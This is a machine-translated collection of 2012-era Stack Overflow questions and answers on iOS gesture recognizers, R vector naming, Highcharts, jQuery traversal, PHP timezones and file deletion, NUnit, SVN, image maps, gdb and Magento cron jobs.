photoBoothController 包含一个名为 canvas 的 UIView。此画布包含几个手势识别器，它们检测手势并执行适当的功能。

问题是当 UIPopoverController 显示时，gestureRecognizers 没有被识别。我已经通过添加 UIButton 对此进行了测试。如果我将它添加为 photoBoothController 的子视图，我可以按下它。但是，如果我将它添加为画布的子视图，我将无法再按下它。

所以我的问题是如何将手势传递给画布？我尝试添加`[canvas becomeFirstResponder]`photoBoothController 的 viewDidAppear 和 viewWillAppear 方法，但似乎没有什么不同。我知道代码在其他方面是合理的，因为它在作为常规视图而不是在 UIPopoverController 中运行时可以完美运行。

非常感谢。

photoBoothController 中的代码：

```
#import "PhotoBoothController.h"

@implementation PhotoBoothController

@synthesize canvas;
@synthesize photoImage;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

#pragma mark - Private Methods

-(void)showOverlayWithFrame:(CGRect)frame {

  if (![_marque actionForKey:@"linePhase"]) {
    CABasicAnimation *dashAnimation;
    dashAnimation = [CABasicAnimation animationWithKeyPath:@"lineDashPhase"];
    [dashAnimation setFromValue:[NSNumber numberWithFloat:0.0f]];
    [dashAnimation setToValue:[NSNumber numberWithFloat:15.0f]];
    [dashAnimation setDuration:0.5f];
    [dashAnimation setRepeatCount:HUGE_VALF];
    [_marque addAnimation:dashAnimation forKey:@"linePhase"];
  }

  _marque.bounds = CGRectMake(frame.origin.x, frame.origin.y, 0, 0);
  _marque.position = CGPointMake(frame.origin.x + canvas.frame.origin.x, frame.origin.y + canvas.frame.origin.y);

  CGMutablePathRef path = CGPathCreateMutable();
  CGPathAddRect(path, NULL, frame);
  [_marque setPath:path];
  CGPathRelease(path);

  _marque.hidden = NO;

}

-(void)scale:(id)sender {

    if([(UIPinchGestureRecognizer*)sender state] == UIGestureRecognizerStateBegan) {
      _lastScale = 1.0;
    }

    CGFloat scale = 1.0 - (_lastScale - [(UIPinchGestureRecognizer*)sender scale]);

    CGAffineTransform currentTransform = photoImage.transform;
    CGAffineTransform newTransform = CGAffineTransformScale(currentTransform, scale, scale);

    [photoImage setTransform:newTransform];

    _lastScale = [(UIPinchGestureRecognizer*)sender scale];
    [self showOverlayWithFrame:photoImage.frame];
}

-(void)rotate:(id)sender {

    if([(UIRotationGestureRecognizer*)sender state] == UIGestureRecognizerStateEnded) {

      _lastRotation = 0.0;
      return;
    }

    CGFloat rotation = 0.0 - (_lastRotation - [(UIRotationGestureRecognizer*)sender rotation]);

    CGAffineTransform currentTransform = photoImage.transform;
    CGAffineTransform newTransform = CGAffineTransformRotate(currentTransform,rotation);

    [photoImage setTransform:newTransform];

    _lastRotation = [(UIRotationGestureRecognizer*)sender rotation];
    [self showOverlayWithFrame:photoImage.frame];
}

-(void)move:(id)sender {
    NSLog(@"MOVING GESTURE");

  CGPoint translatedPoint = [(UIPanGestureRecognizer*)sender translationInView:canvas];

  if([(UIPanGestureRecognizer*)sender state] == UIGestureRecognizerStateBegan) {
    _firstX = [photoImage center].x;
    _firstY = [photoImage center].y;
  }

  translatedPoint = CGPointMake(_firstX+translatedPoint.x, _firstY+translatedPoint.y);

  [photoImage setCenter:translatedPoint];
  [self showOverlayWithFrame:photoImage.frame];
}

-(void)tapped:(id)sender {
  _marque.hidden = YES;
}

#pragma mark - View lifecycle

- (void)viewDidLoad {
  [super viewDidLoad];

  if (!_marque) {
    _marque = [CAShapeLayer layer];
    _marque.fillColor = [[UIColor clearColor] CGColor];
    _marque.strokeColor = [[UIColor grayColor] CGColor];
    _marque.lineWidth = 1.0f;
    _marque.lineJoin = kCALineJoinRound;
    _marque.lineDashPattern = [NSArray arrayWithObjects:[NSNumber numberWithInt:10],[NSNumber numberWithInt:5], nil];
    _marque.bounds = CGRectMake(photoImage.frame.origin.x, photoImage.frame.origin.y, 0, 0);
    _marque.position = CGPointMake(photoImage.frame.origin.x + canvas.frame.origin.x, photoImage.frame.origin.y + canvas.frame.origin.y);
  }
  [[self.view layer] addSublayer:_marque];

  UIPinchGestureRecognizer *pinchRecognizer = [[UIPinchGestureRecognizer alloc] initWithTarget:self action:@selector(scale:)];
  [pinchRecognizer setDelegate:self];
  [self.view addGestureRecognizer:pinchRecognizer];

  UIRotationGestureRecognizer *rotationRecognizer = [[UIRotationGestureRecognizer alloc] initWithTarget:self action:@selector(rotate:)];
  [rotationRecognizer setDelegate:self];
  [self.view addGestureRecognizer:rotationRecognizer];

  UIPanGestureRecognizer *panRecognizer = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(move:)];
  [panRecognizer setMinimumNumberOfTouches:1];
  [panRecognizer setMaximumNumberOfTouches:1];
  [panRecognizer setDelegate:self];
  [canvas addGestureRecognizer:panRecognizer];

  UITapGestureRecognizer *tapProfileImageRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(tapped:)];
  [tapProfileImageRecognizer setNumberOfTapsRequired:1];
  [tapProfileImageRecognizer setDelegate:self];
  [canvas addGestureRecognizer:tapProfileImageRecognizer];

}

- (void)viewWillAppear:(BOOL)animated {
    [self.canvas becomeFirstResponder];
    [super viewWillAppear:animated];
}

- (void)viewDidUnload
{
  [self setPhotoImage:nil];
  [self setCanvas:nil];
  [super viewDidUnload];
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    return NO;
}

#pragma mark UIGestureRegognizerDelegate

- (BOOL)gestureRecognizer:(UIGestureRecognizer *)gestureRecognizer shouldRecognizeSimultaneouslyWithGestureRecognizer:(UIGestureRecognizer *)otherGestureRecognizer {
  return ![gestureRecognizer isKindOfClass:[UIPanGestureRecognizer class]] && ![gestureRecognizer isKindOfClass:[UITapGestureRecognizer class]];
}

@end 
```

初始化代码：

```
- (void)presentPhotoBoothForPhoto:(UIImage *)photo button:(UIButton *)button {

    //Create frame outline image
    UIImage *outline = [[UIImage imageNamed:@"HumptyLine1Frame.png"] adjustForResolution];
    UIImageView *outlineView = [[UIImageView alloc] initWithImage:outline];
    outlineView.frame = CGRectMake(0, 0, outline.size.width, outline.size.height);

    //Create photo image. Already ajusted to resolution?
    UIImageView *photoView = [[UIImageView alloc] initWithImage:photo];
    photoView.frame = CGRectMake(0, 0, photo.size.width, photo.size.height);

    //Add done button
    UIButton *doneButton = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    doneButton.frame = CGRectMake(0, 0, 100, 40);
    [doneButton addTarget:self action:@selector(renderPhoto:) forControlEvents:UIControlEventTouchUpInside];
    [doneButton setTitle:@"Done" forState:UIControlStateNormal];

    //Create canvas with outline as the frame into which the image is rendered
    //Here is where I'll need to define a custom method to create a frame shaped by the outline
    UIView *canvas = [[UIView alloc] initWithFrame:outlineView.frame];
    [canvas setBackgroundColor:[UIColor blackColor]];
    [canvas addSubview:photoView];
    [canvas addSubview:doneButton];

    //Create a photoBooth and set its contents
    PhotoBoothController *photoBoothController = [[PhotoBoothController alloc] init];
    //resize the view
    photoBoothController.contentSizeForViewInPopover = CGSizeMake(canvas.frame.size.width+100, canvas.frame.size.height+50);
    photoBoothController.view.backgroundColor = [UIColor whiteColor];
    photoBoothController.canvas = canvas;
    photoBoothController.photoImage = photoView;
    [photoBoothController.view addSubview:canvas];
    //photoBoothController.view.gestureRecognizers = canvas.gestureRecognizers;

    self.photoBooth = [[UIPopoverController alloc] initWithContentViewController:photoBoothController];
    [self.photoBooth presentPopoverFromRect:button.frame
                                     inView:self.view
                   permittedArrowDirections:UIPopoverArrowDirectionAny
                                   animated:YES];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:25:22.123

我认为你的问题在这里

```
[photoBoothController.view addSubview:canvas];
[photoBoothController.view addSubview:outlineView]; 
```

您在 canvasView 上添加了 outlineView 并且两者都有相同的框架..试试这个

```
[photoBoothController.view  bringSubviewToFront:canvas]; 
```

**只是一个例子：**

```
TestVC *test = [[TestVC alloc] initWithNibName:@"TestVC" bundle:nil];

UIView *testView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 200, 200)];
[testView setBackgroundColor:[UIColor yellowColor]];

test.contentSizeForViewInPopover = CGSizeMake(testView.frame.size.width+100, testView.frame.size.height+50);

UIButton *button = [UIButton buttonWithType:UIButtonTypeCustom];
[button setFrame:CGRectMake(10, 10, 40, 40)];
[button setBackgroundColor:[UIColor redColor]];
[button addTarget:self action:@selector(sss) forControlEvents:UIControlEventTouchUpInside];

[testView addSubview:button];

[test.view addSubview:testView];

UIPopoverController *popover = [[UIPopoverController alloc] initWithContentViewController:test];
[popover presentPopoverFromRect:sender.bounds inView:self.view permittedArrowDirections:UIPopoverArrowDirectionAny animated:YES]; 
```

# r - 在R中索引冗余命名的向量

> ID：10499429
> 
> 赞同：3
> 
> 时间：2012-05-08T13:18:38.503
> 
> 标签：r

在 R 中，当有一个冗余命名的向量时，为什么不能使用选择运算符检索命名向量中的所有元素？

```
v <- c(1,2,3,4,5)
names(v) <- c("a","b","c","c","a")
v["c"] ## Returns only 3, not c(3,4) 
```

看起来 R 假设向量名称是唯一的，并且仅检索名称与选择运算符中的参数匹配的向量中的第一个元素。

这是某种优化吗？如果我们能够在一个向量中选择具有相同名称属性的多个元素，这不是有益的吗？是否要保证使用索引运算符时返回的元素数与索引向量中的元素数相同？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:34:54.267

这是一个有根据的猜测，因此欢迎确认或反驳。（以下确认）

来自`?"["`：“字符向量将与对象的名称匹配”。

```
> match("c",names(v))
[1] 3 
```

您可以使用以下方法解决此问题：

```
> v[names(v)%in%"c"]
c c 
3 4 
```

**编辑**：`[`是一个原始函数，所以它实际上并没有使用`match`. 源代码拥有答案，但我还没有找到它。

**编辑2：**

源码中的答案：R函数`[`调用C函数`do_subset`，可以在源文件**./src/main/subset.c**中找到。在您给出的示例中，C 函数`stringSubscript`最终被调用，并且它遍历作为子集的向量的每个名称（`v`在本例中），直到找到匹配项。此时，迭代停止并返回相应的索引和名称。

因此，当您使用`v["a"]`. 因此，建议遵循其他答案中的建议和使用唯一名称的评论:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:53:26.287

您不想为您尝试做的事情使用名称。您正在创建一个分类变量，而不是唯一地命名每个项目。这是一个重要的语义区别。

```
v <- c(1,2,3,4,5)
cat_v <- c("a","b","c","c","a")
v[cat_v == 'c'] ## Returns c(3,4) 
```

# javascript - 如何将json解析为highcharts

> ID：10499431
> 
> 赞同：4
> 
> 时间：2012-05-08T13:18:49.427
> 
> 标签：javascript, json, highcharts

以下：

```
$.get('/api/ajax_prices/' + product +'/', afterEndexPricesLoaded) 
```

返回一个 json 对象

```
{"aaData": [
    [1, "70.1700", "2008-12-29 11:23:00"],
    [2, "70.2600", "2008-12-29 16:22:00"],
    [3, "70.6500", "2008-12-30 11:30:00"],
    [4, "70.8700", "2008-12-30 16:10:00"],
    [5, "70.5500", "2009-01-02 11:09:00"],
    [6, "70.6400", "2009-01-02 16:15:00"]
]} 
```

我正在尝试将 json 字符串解析为 highchart

这是我正在尝试的代码（数据=高于json字符串）：

```
function afterPricesLoaded(data, textStatus, xhr) {

    var options = {
        chart: {
            renderTo: 'graph'
        },
        title: {
            text: 'Some text',
            style: {
                color: '#888888'
            }
        },
        xAxis: {
            type: 'datetime'
        }
        /*
        series: [{

            data: [
                [Date.UTC(2011, 0, 0), 29.9],
                [Date.UTC(2012, 0, 0), 71.5],
                [Date.UTC(2013, 0, 0), 106.4]
            ]}
        ]*/
    };

    new Highcharts.Chart(options)
} 
```

如何将数据放入 highchart 系列？

**编辑**

**Graphtype** = [http://www.highcharts.com/demo/line-basic](http://www.highcharts.com/demo/line-basic)
**示例**= [http://jsfiddle.net/kevink/9q4AT/](http://jsfiddle.net/kevink/9q4AT/)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T13:40:12.740

这是你要找的吗？

[http://jsfiddle.net/TWF6N/349/](http://jsfiddle.net/TWF6N/349/)

```
$(function () {

    data = {"aaData": [
        [1, "70.1700", "2008-12-29 11:23:00"],
        [2, "70.2600", "2008-12-29 16:22:00"],
        [3, "70.6500", "2008-12-30 11:30:00"],
        [4, "70.8700", "2008-12-30 16:10:00"],
        [5, "70.5500", "2009-01-02 11:09:00"],
        [6, "70.6400", "2009-01-02 16:15:00"]
    ]};

    newData = data.aaData.map( function(row) {
        return [ new Date(row[2]).getTime(), parseInt(row[1]) ];
    });
    console.log(newData);

    var chart = new Highcharts.Chart({
        chart: {
            renderTo: 'container'
        },
        xAxis: {
            type: 'datetime'
        },
        series: [{
            data: newData
        }]
    });
}); 
```

# jquery - 父母与最亲近的人

> ID：10499435
> 
> 赞同：22
> 
> 时间：2012-05-08T13:19:16.127
> 
> 标签：jquery, html, jquery-selectors

为什么会这样：

```
$('.button_30').click(function(){
    $(this).closest('.portlet').find('.portlet_content').text("foo");
});​ 
```

为什么这不起作用：

```
$('.button_30').click(function(){
    $(this).parent('.portlet').find('.portlet_content').text("foo");
});​ 
```

html 看起来像这样：

```
<div class="portlet portlet_30">

    <div class="portlet_header portlet_header_30">
        header content here
    </div>

    <div class="portlet_sub_header portlet_sub_header_30">
        <input type="text" class="textbox_30" />
    </div>

    <div class="portlet_content portlet_content_30">
        results go here
    </div>

    <div class="portlet_footer portlet_footer_30">
        <input type="button" class="button_30" />
    </div>

</div>

<div class="portlet portlet_30">

    <div class="portlet_header portlet_header_30">
        header content here
    </div>

    <div class="portlet_sub_header portlet_sub_header_30">
        <input type="text" class="textbox_30 />
    </div>

    <div class="portlet_content portlet_content_30">
        results go here
    </div>

    <div class="portlet_footer portlet_footer_30">
        <input type="button" class="button_30" />
    </div>

</div> 
```

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-05-08T13:21:33.307

因为**仅**当它与指定的选择器匹配时[`parent()`](http://api.jquery.com/parent)才会返回父级（直接祖先） 。

 **但是，[`closest()`](http://api.jquery.com/closest)将搜索*所有*祖先并返回与选择器匹配的**第一个。**

由于父级`button_30`是 a `div`，其父级是`div`具有 类的`portlet`，因此该`parent()`函数不匹配它并返回一个空集，其中`closest()` **-as**匹配它。

* * *

要在这里完成一组类似的方法，你有[`parents()`](http://api.jquery.com/parents)，这就像`closest()`但*不会*在第一个匹配的元素处停止；它返回与选择器匹配的所有祖先。

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2012-05-08T13:21:38.880

*   [`.parent()`](http://api.jquery.com/parent/)只看直系祖先。

*   [`.closest()`](http://api.jquery.com/closest/)查看所有祖先以及原始元素，并返回第一个匹配项。

*   [`.parents()`](http://api.jquery.com/parents/)查看所有祖先，并返回所有匹配项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:21:53.903

`parent()`只能向上看一级，可以尝试`parents()`一直向上搜索

```
$('.button_30').click(function(){
    $(this).parents('.portlet').find('.portlet_content').text("foo");
});​ 
```

你可以看到[文档](http://api.jquery.com/parents/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:22:15.353

[ `closest`*^([API Ref]](http://api.jquery.com/closest/))*方法向上遍历祖先树，直到找到匹配的选择器。

[ `parent`*^([API Ref]](http://api.jquery.com/parent/))*方法只查看直接父级。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T13:22:30.783

该`parent`方法仅检查元素链的上一级，同时`closest`将继续检查父级列表，直到找到匹配项（或到达 html 标记）。等效的是：

```
$('.button_30').click(function(){
    $(this).parents('.portlet:eq(0)').find('.portlet_content').text("foo");
});​ 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-08T13:22:06.617

因为唯一匹配的元素`.portlet`是*祖父母*，而不是绑定事件的元素的父母

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-05-08T13:23:29.970

因为在第二个选择器中，您正在寻找父节点，并且此函数移动到 `DOM`节点父亲，但仅`one level`包含类`portlet_footer portlet_footer_30`而不是您传递给选择器`.portlet`以使用的类，`parent`换句话说，您应该移动两个级别.

`each time that you're using parent you move one node up`**

# php - 日期函数在我的登台服务器上发出警告

> ID：10499438
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:19:42.157
> 
> 标签：php, date

我像这样在我的 php 脚本中使用日期函数

```
 $doy = date('z') + 1;
 $edition = date('Y') . $doy; 
```

在我的本地机器上，它没有给我任何警告，但在我的登台服务器上，它给出了以下警告，为什么会这样。我怎样才能删除这个？

消息：date() [function.date]：依赖系统的时区设置是不安全的。您*需要*使用 date.timezone 设置或 date_default_timezone_set() 函数。如果您使用了这些方法中的任何一种，但仍然收到此警告，您很可能拼错了时区标识符。我们为 '2.0/DST' 选择了 'Europe/Paris'

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-08T13:23:04.753

> 您需要使用 date.timezone 设置或 date_default_timezone_set() 函数。

这正是你必须做的……

```
date_default_timezone_set('Europe/Paris'); 
```

或者在 php.ini 中：

```
date.timezone = Europe/Paris 
```

显然，您可以使用任何您想要的时区。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:22:34.697

在调用 date() 之前，使用 date_default_timezone_set('Europe/Kiev') 设置您的默认时区。支持的时区列表在这里：[http ://ru2.php.net/manual/en/timezones.php](http://ru2.php.net/manual/en/timezones.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:22:47.757

您可以在页面顶部设置默认时区

```
 date_default_timezone_set('America/Chicago'); 
```

如果你只是想暂时使用它

```
 $dateTime = new DateTime();
   $DateTimeZone = timezone_open ( 'America/Chicago' );
   $dateTime->setTimezone( $DateTimeZone );
   echo $dateTime->format("Y") , ($dateTime->format("z") + 1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T04:18:47.630

你想要一年中的哪一天还是时区？既然你把它命名为 $doy，我以为你想要 Day Of Year。但是，您收到的所有错误消息都涉及时区。在 Oreilly Book 的第 139 页上，有一个日期函数格式说明符列表，您使用的小写“z”表示一年中的某一天。在书中的其他地方，我读到大写的“Z”代表时区。当错误消息回复时区时，似乎出现了某种故障，但您的代码指定了一年中的哪一天。

我参考的书是“Learning PHP, MySQL, JavaScript, & CSS”。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-05-08T13:23:38.543

这是由登台服务器上的错误设置引起的。您可以通过更改错误报告级别来删除此输出

例子：

```
// Report simple running errors
error_reporting(E_ERROR | E_WARNING | E_PARSE); 
```

您可以在 php 网站上找到更多信息：http: [//php.net/manual/en/function.error-reporting.php](http://php.net/manual/en/function.error-reporting.php)

但是您也可以像巴巴发布的那样解决此消息。

# .net - nunit.exe 因 ConfigurationErrorsException 而崩溃

> ID：10499439
> 
> 赞同：1
> 
> 时间：2012-05-08T13:19:50.143
> 
> 标签：.net, configuration, nunit

我已经从[http://nunit.org/](http://nunit.org/) (2.6.0.12051) 安装了当前最新的 NUnit 版本。

当我尝试运行 nunit.exe 文件时，我收到`ConfigurationErrorsException`一条消息：“配置系统初始化失败”。它还包含`InnerException`一条消息“无法识别的配置部分启动。（C:\Program Files (x86)\NUnit 2.6\bin\nunit.exe.Config line 10）”。

如果我启动 nunit-86.exe，它会工作，尽管它使用完全相同的配置文件。

我将我机器上的 Machine.config 与干净虚拟机中的 Machine.config 进行了比较，它们是相同的。此外，nunit.exe 在干净的 VM 上工作，因此我的开发机器可能有问题。

.NET 4 安装在我的机器上。它运行 Windows 7 x64。

这怎么可能解决？这种行为的原因可能是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:29:45.083

我希望这可以帮助其他面临同样问题的人。这不是解决方案，而是我想出的解决方法。

nunit.exe.config 文件包含以下标签：

```
<startup useLegacyV2RuntimeActivationPolicy="true">
  <!-- Comment out the next line to force use of .NET 4.0 -->
  <supportedRuntime version="v2.0.50727" />
  <supportedRuntime version="v4.0.30319" />
</startup> 
```

我做了评论所说的 - 注释掉了 .NET v2.0 行，该过程现在加载到不同的运行时并且一切正常。

我不知道为什么 .NET 2.0 不起作用，但这不是我第一次遇到这个问题（Fiddler 和 Windows Azure 模拟器也会有这个问题）。

我希望有人能解释 .NET 2.0 不起作用的原因或如何修复它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:49:17.823

您可以尝试使用此工具来验证您的 .net 框架安装：http: [//blogs.msdn.com/b/astebner/archive/2008/10/13/8999004.aspx](http://blogs.msdn.com/b/astebner/archive/2008/10/13/8999004.aspx)

更新：我刚刚在我的机器上遇到这个问题并运行该工具并检查错误日志，它显示我的 2.0 安装缺少我的 machine.config。奇怪，但它解决了问题。

# visual-studio-2010 - 如何将 svn 状态“已替换”变为“已修改”

> ID：10499444
> 
> 赞同：2
> 
> 时间：2012-05-08T13:20:11.023
> 
> 标签：visual-studio-2010, svn, entity-framework-4.1, t4, visualsvn

我使用 EF4.1、Visualstudio 2010、VisualSVN。我以某种方式更改（损坏）模型，无法生成任何 edmx 文件。然后从项目中删除所有这些文件。然后我修复了模型，因此文件再次生成并重新添加到项目中。但是现在 subversion 将所有这些文件报告为“已替换”。我怎样才能关闭这个“功能”，或者至少，我怎样才能以一种简单的方式处理它？（比删除/svn-revert/copyback 更容易）

# html - 为图像映射中的区域设置边框

> ID：10499446
> 
> 赞同：5
> 
> 时间：2012-05-08T13:20:16.140
> 
> 标签：html

我正在尝试在图像地图区域周围添加边框。

这是具有 3 个扇区的图像映射的示例。

```
<body>
<img src="trees.gif" usemap="#green" border="0">
<map name="green">
<area shape="polygon" coords="19,44,45,11,87,37,82,76,49,98" href="http://www.trees.com/save.html">
<area shape="rect" coords="128,132,241,179" href="http://www.trees.com/furniture.html">
<area shape="circle" coords="68,211,35" href="http://www.trees.com/plantations.html">
</map>
</body> 
```

如果我能以某种方式在该区域周围放置一个 2 像素的边框，那就太好了。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-08T13:27:39.547

使用直接的 HTML/CSS 无法做到这一点。尽管 IE6/7 不支持 SVG，但您可以使用 SVG。

您可能会发现这个 JavaScript 插件的使用：[http](http://www.outsharked.com/imagemapster/) ://www.outsharked.com/imagemapster/特别是它的`stroke`设置。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-08-15T15:27:31.980

我认为可以做的最好的事情是

```
<body>
  <style> a { border: 2px solid rgba(255,0,0,.1); }
          a:hover{ border:2px solid rgba(0,0,255,.3); }</style>
  <div style="position:relative">
    <img src="trees.gif" width="1727" height="1434" />
    <a href="http://www.trees.com/furniture.html"
         style="display:block; width:247px; height:66px; left: 48px; top: 275px;
         position:absolute;"></a>
  </div>
</body> 
```

尽管您失去了`<area>`s,（多边形）的一些灵活性，但您获得了 s 的所有样式功能`<a>`。

# linux - 在linux上使用gdb调试核心转储时如何知道线程的状态？

> ID：10499447
> 
> 赞同：0
> 
> 时间：2012-05-08T13:20:16.507
> 
> 标签：linux, gdb, signals, coredump, thread-state

我在线程中崩溃了。在使用 gdb 调试 coredump 时，我想在崩溃前查看线程的状态。

在我的程序中，我正在为该线程发出信号并处理它。了解线程崩溃之前的状态以及为该线程发出信号之前的时间会很有帮助。是否可以从 gdb 获取此信息？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:40:34.103

使用 gdb 7.4 的“可逆调试”是可能的。[在这里](http://www.jayconrod.com/posts/28/tutorial-reverse-debugging-with-gdb-7)寻找一个小教程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:27:07.877

请参考这个页面

[http://linux-hacks.blogspot.com/2009/07/looking-at-thread-state-inside-gdb.html](http://linux-hacks.blogspot.com/2009/07/looking-at-thread-state-inside-gdb.html)

# php - 从服务器中删除图像文件

> ID：10499450
> 
> 赞同：12
> 
> 时间：2012-05-08T13:20:35.070
> 
> 标签：php, delete-file

我想知道是否有人可以帮助我。

我整理了[这个](http://www.mapmyfinds.co.uk/development/deletetest.php#/0)页面，允许用户以画廊格式查看他们上传的图像。

我现在想为每个图像添加删除功能。我已经创建了按钮和它背后的 Javascript，但我真的不确定如何将“按钮单击”与文件的实际物理删除联系起来。

这些图像没有存储在数据库中，而是位于我服务器上的两个文件夹位置，结构如下：

`UploadedFiles/username/locationid/imagename`和

`UploadedFiles/username/locationid/Thumbnails/imagename`

我对 PHP 比较陌生，现在我已经达到了我的知识极限，但肯定愿意学习。从我读过的文档中，我认为我说该`unlink`方法是正确使用的命令是正确的？

但是我发现真正困难的是告诉代码找到与当前匹配的文件夹`username`和文件夹，然后删除与名称变量匹配的文件。`locationid``username``locationid``$source`

我只是想知道是否有人可以就我如何解决这个问题提供一些指导。

非常感谢和亲切的问候

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T13:22:59.423

如果您可以将用户名、locationid 和 imagename 变量传递给脚本，则可以使用以下命令删除文件`unlink()`：

```
$path = 'UploadedFiles/' . $username . '/' . $locationid . '/';

unlink( $path . $imagename );
unlink( $path . 'Thumbnails/' . $imagename ); 
```

因为您正在与文件系统进行交互，所以您需要确定并清理变量（防止有人使用 ../../../ 访问文件系统中不需要的部分）。

```
$username = str_replace( array( '..', '/', '\\', ':' ), '', $username );
$imagename = str_replace( array( '..', '/', '\\', ':' ), '', $imagename );
$locationid= str_replace( array( '..', '/', '\\', ':' ), '', $locationid ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:41:52.077

显然，您的 javascript（客户端）将不得不调用 URL（服务器端）来删除用户选择的图片。我建议现在你静态地做（如果以后你想转向更动态的东西，那么转换成 ajax 的步骤相当小。

因此，正如 Set Sail Media 所说，单击删除按钮时，您必须将用户名和 locationID 传递给您的服务器。一种方法是：

当以 HTML/javascript 呈现您的画廊时，对于每张图片，您在其下方都有一个包含所需信息的 a，提交按钮将简单地从您的服务器调用删除脚本。你可以做的一个例子是：

```
 <form name="deleteImageX" method="GET" target="your.server.org/deleteImage.php">
        <input type="hidden" name="userName" value="theUserNameAssociatedWithThePicture" />
        <input type="hidden" name="locationId" value="locationOfThePicture" />
        <input type="submit" value="delete"/>
    </form> 
```

此表单会将所需的值存储在隐藏字段中，这些字段不会显示在网页上，但在按下提交按钮时仍会发送到服务器。

（对于这个小故事，这里使用的方法是 GET，因为 AFAIK HTML 不支持 DELETE 方法（这在我们的例子中是合适的））。

GET 方法将调用脚本“your.server.org/deleteImage.php”。在此脚本中，您将拥有使用 $_GET['username'] 和 $_GET['locationId'] 变量删除图像所需的所有信息（用户名/locationId）。然后正如您所提到的，您将需要使用 unlink 方法从服务器中实际删除文件。

最后，完成此操作后，您需要重定向 php 脚本，以便在删除图像后再次显示图库（例如）。如果你有某种模板引擎，这可以通过调用脚本来完成，或者通过调用 php.ini 的“header”函数来完成。

我希望这个流程是你所期望的，我希望我对你有所帮助。

问候，

熊

# jquery - Flowplayer getTime() 给了我一个对象

> ID：10499467
> 
> 赞同：1
> 
> 时间：2012-05-08T13:21:37.270
> 
> 标签：jquery, flowplayer

我正在使用 flowplayer-3.2.10，当我单击一个按钮时，我想将时间从时间线获取到输入框中。但每次如果我尝试做某事，我都会收到一个对象。

```
<html>
<head>
<script src="jquery-1.7.2.min.js"></script>
<script type="text/javascript" src="../flowplayer-3.2.9.min.js"></script>
<script type="text/javascript">
 function video1 () {
   alert($f().getTime());
 }   
 </script>

</head>

<body>

        <a  
             href="http://pseudo01.hddn.com/vod/demo.flowplayervod/flowplayer-700.flv"
             style="display:block;width:520px;height:330px"  
             id="player"> 
        </a> 

        <script>
            flowplayer("player", "../flowplayer-3.2.10.swf");               
            </script>
    <form>
        <a href='javascript:video1();'>Start</a> <input type="text" name="start_id_0" id="start_id_0" /><br/>
    </form> 
</body>
</html> 
```

有人能帮我吗？

亲切的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:45:23.657

我刚刚对此进行了测试，它按预期工作。

`$("#start_id_0").val($f().getTime());`

# magento - M2E Cron 作业不会在 Magento 中自动运行

> ID：10499471
> 
> 赞同：0
> 
> 时间：2012-05-08T13:21:49.263
> 
> 标签：magento, cron, ebay-api, m2e

我们已经在一个客户端的 Magento 安装上安装了 M2E - 所有 Cron 作业都设置为运行，但除非我们手动执行它们，否则它们只是没有运行。手动运行它们确实可以正常工作。

我已经阅读了很多文档和支持票，但似乎没有发现类似的问题或修复它。

同步选项卡有一条消息说：

> 上次同步是 12 小时前由 cron 执行的。请检查 Magento cron 作业配置。

有没有人有任何有用的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:40:25.673

我会看一下该表`cron_schedule`，并确保`cron.php`它在您的环境中的 crontab 守护程序本身内正确设置和执行。

*   [http://www.magentocommerce.com/wiki/1_-_installation_and_configuration/how_to_setup_a_cron_job](http://www.magentocommerce.com/wiki/1_-_installation_and_configuration/how_to_setup_a_cron_job)

另外，我认为 M2E 模块要求必须禁用管理员添加密钥选项才能正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-06T17:13:23.093

查找 /var/M2ePro/cron.lock，将其删除，然后检查 M2E 的 cron 是否正常工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-27T20:28:54.040

这是一个老问题，但如果其他人遇到它并且在运行他们的 cron 作业时遇到问题，可能只是因为您使用的是旧版本的 php！默认情况下，在我的情况下，在 1and1 上，只需使用 php 命令即可获得 v4.4.9。我必须明确强制 php v5 然后它才能工作！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-18T22:43:53.790

不幸的是，我在 /var 下没有 M2ePro 目录，即使在 cron 中配置了同步也不会启动。

